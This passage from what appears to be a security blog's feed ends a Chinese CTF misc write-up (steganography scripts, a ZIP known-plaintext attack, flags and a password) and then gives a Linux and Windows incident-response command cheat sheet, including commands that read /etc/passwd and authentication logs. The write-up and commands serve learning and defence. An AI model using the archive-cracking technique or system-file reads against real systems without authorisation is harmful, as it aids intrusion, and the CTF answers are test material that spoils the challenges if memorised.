class="hljs-keyword">import</span> pandas<br>s=<span class="hljs-number">55</span><br>s1=<span class="hljs-number">60</span><br>e=<span class="hljs-number">1023</span><br>e1=<span class="hljs-number">1028</span><br>l=<span class="hljs-number">0</span><br>r=<span class="hljs-number">63</span><br><br><br>img1=Image.new(<span class="hljs-string">&quot;1&quot;</span>,(<span class="hljs-number">1050</span>,<span class="hljs-number">140</span>))<br><br>x1=pandas.read_excel(<span class="hljs-string">&quot;1.xlsx&quot;</span>)<br>x1values=x1.values<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(s-<span class="hljs-number">2</span>,e-<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,r):<br>        <span class="hljs-keyword">if</span> x1values[i][j]&gt;=<span class="hljs-number">5</span>:<br>            img1.putpixel((i,j),<span class="hljs-number">255</span>)<br>        <span class="hljs-keyword">else</span>:<br>            img1.putpixel((i,j),<span class="hljs-number">0</span>)<br><br><br>x2=pandas.read_excel(<span class="hljs-string">&quot;2.xlsx&quot;</span>)<br>x2values=x2.values<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(s1-<span class="hljs-number">2</span>,e1-<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,r):<br>        <span class="hljs-keyword">if</span> x2values[i][j]&gt;=<span class="hljs-number">5</span>:<br>            img1.putpixel((i-<span class="hljs-number">5</span>,j+<span class="hljs-number">63</span>),<span class="hljs-number">255</span>)<br>        <span class="hljs-keyword">else</span>:<br>            img1.putpixel((i-<span class="hljs-number">5</span>,j+<span class="hljs-number">63</span>),<span class="hljs-number">0</span>)<br>img1=img1.transpose(Image.FLIP_LEFT_RIGHT)<br>img1.save(<span class="hljs-string">&#x27;img.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>密码w0wyoudo4goodj0b</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-6.png"></p><p>对于wav的带密码的隐写，猜测是DeepSound</p><p>解密得到<code>flag.txt</code>和<code>fl4g.txt</code></p><p>fl4g.txt中的字符串先base85在base32，得到<code>sQ+3ja02RchXLUFmNSZoYPlr8e/HVqxwfWtd7pnTADK15Evi9kGOMgbuIzyB64CJ</code></p><p>观察发现恰好是64位，从a-z,A-Z,0-9,+,&#x2F;  猜测是base换表，flag.txt中的值作为密文</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-7.png"></p><h2 id="两只老虎"><a href="#两只老虎" class="headerlink" title="两只老虎"></a>两只老虎</h2><p>只给了一张图片，但是发现图片后面的IDAT突然变小了</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-8.png"></p><p>所以可以删掉前面所有长65536的IDAT块再删一个34018的IDAT块（参考正常的png图片）</p><p>爆破宽高，得到右边那张图片，发现右边多了一些像素</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-9.png"></p><p>原来的图片是1134x720，变成了1144x720</p><p>红色部分全是(255,0,0)，既然两图类似，就放stegsolve尝试xor，发现很多小像素点不规律分布</p><p>最后发现可以提取每行非黑色像素点的个数去转字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;solved.bmp&#x27;</span>)<br>w,h = img.size<br>count = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>    tmp = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        pixel = img.getpixel((j,i))<br>        <span class="hljs-keyword">if</span>(pixel != (<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)):<br>            tmp += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span>(tmp!=<span class="hljs-number">10</span>):<br>        count.append(tmp-<span class="hljs-number">10</span>)<br><span class="hljs-built_in">print</span>(count)<br><br>count = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(num) <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> count)<br><span class="hljs-built_in">print</span>(count)<br><span class="hljs-comment">#[68, 65, 83, 67, 84, 70, 123, 116, 87, 111, 95, 116, 49, 103, 101, 114, 115, 95, 114, 85, 110, 95, 102, 64, 115, 116, 125]</span><br><span class="hljs-comment">#DASCTF&#123;tWo_t1gers_rUn_f@st&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Easy-VMDK"><a href="#Easy-VMDK" class="headerlink" title="Easy_VMDK"></a>Easy_VMDK</h2><blockquote><p>小明这次使用了32Bytes的随机密码，这次总不会被爆破出来了吧！！<br>小明压缩了好了题目后，他发现压缩后大小比压缩前还大啊，这不就没有压缩啊，这是为什么啊！</p></blockquote><p>对压缩包进行明文攻击，本地看下自己的几个vmdk文件头，发现均为<code>4B 44 4D 56 01 00 00 00 03 00 00 00</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-10.png"></p><p>拿到一个<code>flag.zip</code>和<code>key.txt</code></p><p>flag.zip分离出一个带密码的压缩包和一个py脚本，其中是key.txt的加密过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> binascii<br><br><br>img = cv2.imread(<span class="hljs-string">&quot;key.png&quot;</span>)<br>r, c = img.shape[:<span class="hljs-number">2</span>]<br><span class="hljs-built_in">print</span>(r, c)<br><span class="hljs-comment"># 137 2494</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;key.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(r):<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(c):<br>            uu_byte = binascii.a2b_uu(<span class="hljs-string">&#x27;, &#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">str</span>(x), img[y, x])) + <span class="hljs-string">&quot;\n&quot;</span>)<br>            f.write(base64.b64encode(uu_byte).decode() + <span class="hljs-string">&quot;\n&quot;</span>)<br></code></pre></td></tr></table></figure><p>解密过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-comment"># 读取 key.txt 文件内容</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;key.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    lines = f.readlines()<br><br><span class="hljs-comment"># 创建空白图像</span><br>img = np.zeros((<span class="hljs-number">137</span>, <span class="hljs-number">2494</span>), dtype=np.uint8)<br><br><span class="hljs-comment"># 还原图像像素值</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">137</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2494</span>):<br>        <span class="hljs-comment"># 解码 base64 数据</span><br>        encoded_data = lines[y * <span class="hljs-number">2494</span> + x].strip()<br>        decoded_data = base64.b85decode(encoded_data.encode())<br><br>        <span class="hljs-comment"># 获取像素值</span><br>        pixel_value = <span class="hljs-built_in">int</span>.from_bytes(decoded_data, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>) % <span class="hljs-number">256</span><br><br>        <span class="hljs-comment"># 设置图像像素</span><br>        img[y, x] = pixel_value<br><br><span class="hljs-comment"># 保存还原后的图像</span><br>cv2.imwrite(<span class="hljs-string">&quot;restored_key.png&quot;</span>, img)<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-11.png"></p><p>用这个密码去解压，得到flag</p><h2 id="GIFuck"><a href="#GIFuck" class="headerlink" title="GIFuck"></a>GIFuck</h2><p>根据帧长切割，利用ocr进行批量识别</p><p><code>++++[-&gt;++++&lt;]&gt;[-&gt;++++++&lt;]&gt;-[-&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]+++&lt;++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;+++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;][-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;][-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;][-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;&lt;+++++++++[-&gt;+++++++++&lt;]&gt;++.&lt;+++++[-&gt;+++++&lt;]&gt;+++.+++..+++++++.&lt;+++++++++[-&gt;---------&lt;]&gt;--------.&lt;++++++++[-&gt;++++++++&lt;]&gt;++.&lt;++++[-&gt;++++&lt;]&gt;+++.-.&lt;+++++++++[-&gt;---------&lt;]&gt;---.&lt;+++++++++[-&gt;+++++++++&lt;]&gt;++++++++.&lt;+++[-&gt;---&lt;]&gt;-.++++++.---.&lt;+++++++++[-&gt;---------&lt;]&gt;-.&lt;++++++++[-&gt;++++++++&lt;]&gt;++++++.++++++.&lt;+++[-&gt;---&lt;]&gt;--.++++++.&lt;++++++++[-&gt;--------&lt;]&gt;-------.&lt;++++++++[-&gt;++++++++&lt;]&gt;+++++++++.&lt;+++[-&gt;+++&lt;]&gt;+.&lt;+++++++++[-&gt;---------&lt;]&gt;--.&lt;++++++++[-&gt;++++++++&lt;]&gt;++++++++++++++.+.+++++.&lt;+++++++++[-&gt;---------&lt;]&gt;---.&lt;++++++++[-&gt;++++++++&lt;]&gt;++++++++.---.&lt;+++[-&gt;+++&lt;]&gt;++++.&lt;+++[-&gt;---&lt;]&gt;----.&lt;+++++++[-&gt;-------&lt;]&gt;------.[-]&lt;</code></p><p>会输出<code>Sorry but your flag is not here.</code></p><p>真正的flag藏在内存中</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-12.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;D0n’t-pl4y-g4m3&quot;&gt;&lt;a href=&quot;#D0n’t-pl4y-g4m3&quot; class=&quot;headerlink</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="羊城杯" scheme="https://www.lewiserii.top/tags/%E7%BE%8A%E5%9F%8E%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>应急响应中的常用命令</title>
    <link href="https://www.lewiserii.top/hw/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4.html"/>
    <id>https://www.lewiserii.top/hw/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4.html</id>
    <published>2023-07-18T05:00:00.000Z</published>
    <updated>2023-08-02T06:06:07.540Z</updated>
    
    <content type="html"><![CDATA[<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><p><strong>应急响应流程</strong></p><p>事件判断：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DDos等等</p><p>临时处置：给出客户临时处置建议，断网隔离，保护现场环境</p><p>信息收集分析：收集客户信息和中毒主机信息，包括样本，日志分析、进程分析、启动项分析</p><p>清理处置：直接杀掉进程，删除文件，打补丁，抑或是修复文件</p><p>产出报告：整理并输出完整的安全事件报告</p><h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h2 id="重要文件和目录"><a href="#重要文件和目录" class="headerlink" title="重要文件和目录"></a>重要文件和目录</h2><table><thead><tr><th>文件名</th><th>说明</th></tr></thead><tbody><tr><td>&#x2F;etc&#x2F;passwd</td><td>用户信息文件</td></tr><tr><td>&#x2F;etc&#x2F;crontab</td><td>定时任务文件</td></tr><tr><td>&#x2F;etc&#x2F;anacrontab</td><td>异步定时任务</td></tr><tr><td>&#x2F;etc&#x2F;rc.d&#x2F;rc.local</td><td>开机启动项</td></tr><tr><td>&#x2F;etc&#x2F;hosts</td><td>本地IP地址域名解析文件</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;btmp</td><td>登录失败日志</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;wtmp</td><td>包含用户登录日志</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;utmp</td><td>当前登陆系统的用户信息</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;cron</td><td>定时任务执行日志</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;lastlog</td><td>所有用户最近登录信息</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;secure</td><td>验证，授权等日志</td></tr></tbody></table><table><thead><tr><th>目录</th><th>说明</th></tr></thead><tbody><tr><td>&#x2F;root&#x2F;.ssh</td><td>root用户ssh公钥和私钥</td></tr><tr><td>&#x2F;tmp</td><td>系统或用户临时文件的目录</td></tr><tr><td>&#x2F;etc&#x2F;init.d</td><td>开机启动项</td></tr><tr><td>&#x2F;var&#x2F;log</td><td>日志默认存放目录</td></tr></tbody></table><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>查看当前目录下所有文件并排序<br><code>ls -alt</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-1.png"></p><p>查看系统内存使用情况<br><code>free -h</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-2.png"></p><p>查看系统进程及子进程<br><code>ps auxf</code>、<code>top</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-3.png"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-4.png"></p><p>查看网络连接<br><code>netstat -antpl</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-5.png"></p><p>根据pid使用<code>ls -alh /proc/pid</code>命令查看对应的可执行程序</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-6.png"></p><p>查询端口打开的文件<br><code>lsof -i:port</code></p><p>查询进程打开的文件<br><code>lsof -p pid</code></p><p>查询用户打开的文件<br><code>lsof -u root</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-7.png"></p><p>修改文件属性<br><code>chattr</code></p><p>显示文件属性<br><code>lsattr</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-8.png"></p><p>排查启动项<br><code>cat /etc/rc.local</code><br><code>ls -alt /etc/profile.d/*.sh</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-9.png"></p><p>查看所有用户的定时任务<br><code>cat /etc/passwd | cut -f 1 -d : | xargs -I &#123;&#125; crontab -l -u &#123;&#125;</code><br><code>ls -altr /var/spool/cron/*</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-10.png"></p><p>查看历史命令<br><code>history</code><br><code>cat ~/.bash_history</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-11.png"></p><p>校验软件包<br><code>rpm -Va</code><br><code>dpkg --verify</code></p><table><thead><tr><th>值</th><th>说明</th></tr></thead><tbody><tr><td>S</td><td>表示对应文件的大小不一致</td></tr><tr><td>M</td><td>表示对应文件权限和所有权不一样</td></tr><tr><td>5</td><td>表示对应文件的MD5不一致</td></tr><tr><td>D</td><td>表示文件的设备号和驱动程序不一致</td></tr><tr><td>L</td><td>表示文件的符号连接内容不一致</td></tr><tr><td>U</td><td>表示文件所有者不一致</td></tr><tr><td>G</td><td>表示文件群组不一致</td></tr><tr><td>T</td><td>表示文件的修改时间不一致</td></tr></tbody></table><blockquote><p>软件更新会导致大小或MD5不一致，同时出现SM5需要注意</p></blockquote><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-12.png"></p><p>查看文件（目录）详细信息<br><code>stat</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-13.png"></p><p>查找当前目录下，指定天数内修改的指定类型文件<br><code>find / -mtime 0 -name *.jsp</code></p><p>查找当前目录下，指定天数内新增的指定类型文件<br><code>find / -ctime 0 -name *.jsp</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-14.png"></p><p>比较文件差异<br><code>diff -c</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-15.png"></p><p>查找隐藏进程<br><code>ps -ef | awk &#39;&#123;print $2&#125;&#39; |sort -n |uniq &gt; ps.p</code><br><code>ls /proc |sort -n |uniq &gt; proc.p</code><br><code>diff ps.p proc.p</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-16.png"></p><p>查看用户登录历史记录<br><code>last</code></p><p>查看用户登录失败记录<br><code>lastb</code></p><p>查看用户最近一次登录信息<br><code>lastlog</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-17.png"></p><p>登录成功的IP<br><code>grep &quot;Accepted&quot; /var/log/secure | awk &#39;&#123;print $11&#125;&#39; |sort |uniq -c |sort -nr | more</code></p><p>定位有爆破行为的IP<br><code>grep &quot;Failed&quot; /var/log/secure | awk &#39;&#123;print $11&#125;&#39; |sort |uniq -c |sort -nr | more</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-18.png"></p><p>查找每个IP地址的失败登录次数：<br><code>awk &#39;/sshd.*Failed/ &#123;print $(NF-3)&#125;&#39; /var/log/secure | sort | uniq -c |sort -nr</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-19.png"></p><p>查找特定IP地址的失败登录：<br><code>grep &quot;sshd.*Failed.*from &lt;IP_ADDRESS&gt;&quot; /var/log/secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-20.png"></p><p>查找特定IP地址的成功登录：<br><code>grep &quot;sshd.*Accepted.*from &lt;IP_ADDRESS&gt;&quot; /var/log/secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-21.png"></p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">Linux日志类型大致可以分为三类，内核和系统日志，用户日志，应用日志<br><br>内核和系统日志：这种日志主要由syslog管理、根据其配置文件/etc/syslog.conf中的设置决定内核消息和各种系统程序信息记录到哪个位置<br>用户日志：用户日志主要记录系统用户登录或者退出的信息，包括用户名账号、登录时间、源IP等<br>应用日志：记录应用程序运行过程中的各种事件信息<br></code></pre></td></tr></table></figure><p>可以使用系统自带的awk，find，grep去分析前面提到的各种日志（建议使用busybox，以防命令被篡改）<br>也可以使用第三方的分析工具，比如LogForensics，星图等等</p><h2 id="应急工具"><a href="#应急工具" class="headerlink" title="应急工具"></a>应急工具</h2><p><strong>busybox</strong></p><p>集成了很多linux常用命令的工具集，当命令被劫持或篡改时使用</p><p>官网：<a href="https://busybox.net/">https://busybox.net/</a></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-22.png"></p><p><strong>unhide</strong></p><p>检测发现借助rootkit及其他技术隐藏的进程和TCP&#x2F;UDP端口的命令行工具</p><p><code>yum -y install unhide</code>安装或者在<a href="https://www.unhide-forensics.info/">官网下载</a></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-23.png"></p><p><strong>chkrootkit</strong></p><p>linux下检测rootkit的脚本</p><p>ubuntu系列安装命令：<code>apt install chkrootkit</code><br>centos系列：由于chkrootkit没有包含在官方的Centos源中，因此要采取手动编译的方法来安装，<a href="https://www.chkrootkit.org/">官网</a></p><p>直接运行后查找infected关键字即可</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-24.png"></p><p><strong>clamav</strong></p><p>检测木马、病毒、恶意软件和其他恶意威胁的开源防病毒引擎</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-25.png"></p><h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h2 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h2><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>regedit</td><td>注册表</td></tr><tr><td>taskmgr</td><td>任务管理器</td></tr><tr><td>msconfig</td><td>系统配置</td></tr><tr><td>eventvwr</td><td>事件查看器</td></tr><tr><td>compmgmt.msc</td><td>计算机管理</td></tr><tr><td>gpedit.msc</td><td>本地组策略</td></tr><tr><td>taskschd.msc</td><td>计划任务</td></tr><tr><td>lusrmgr.msc</td><td>本地用户和组</td></tr></tbody></table><p>查看网络连接<br><code>netstat -ano</code></p><p>操作系统的详细配置信息<br><code>systeminfo</code></p><p>获取系统进程信息<br><code>wmic process</code></p><p>根据应用程序查找PID<br><code>wmic process where name=&quot;cmd.exe&quot; get processid,executablepath,name</code></p><p>根据PID查找应用程序<br><code>wmic process where processid=&quot;9096&quot; get executablepath,name</code></p><p>获取系统进程信息<br><code>tasklist</code></p><p>对于要查询特定dll的调用情况，可以使用<br><code>tasklist /d dll名称</code></p><p>计算样本MD5<br><code>certutil -hashfile %样本exe% md5</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;应急响应&quot;&gt;&lt;a href=&quot;#应急响应&quot; class=&quot;headerlink&quot; title=&quot;应急响应&quot;&gt;&lt;/a&gt;应急响应&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;应急响应流程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;事件判断：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、</summary>
      
    
    
    
    <category term="应急响应" scheme="https://www.lewiserii.top/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="hw" scheme="https://www.lewiserii.top/tags/hw/"/>
    
    <category term="应急响应" scheme="https://www.lewiserii.top/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
